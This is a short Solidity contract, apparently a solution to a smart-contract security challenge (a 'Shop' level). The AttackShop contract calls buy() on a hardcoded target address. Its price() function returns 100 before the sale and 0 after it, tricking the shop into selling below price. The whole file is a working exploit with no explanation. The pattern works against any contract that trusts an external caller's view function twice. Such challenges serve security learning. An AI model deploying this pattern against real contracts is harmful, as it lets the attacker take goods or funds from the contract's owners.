// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IBuyer {
  function price() external view returns (uint);
}

interface IShop {
  function isSold() external view returns (bool);
  function buy() external;
}
contract AttackShop is IBuyer{
  IShop level;
  bool visited;
   constructor() public {
     level = IShop(0xcCa7C1eA3d0dAA4B8A2537456218397421E054f4);
   }
  
  function attack() public {
    level.buy();
  }

function price() external override view returns (uint) {
  if (!level.isSold()) {
    return 100;
  } else {
    return 0;
  }
}
}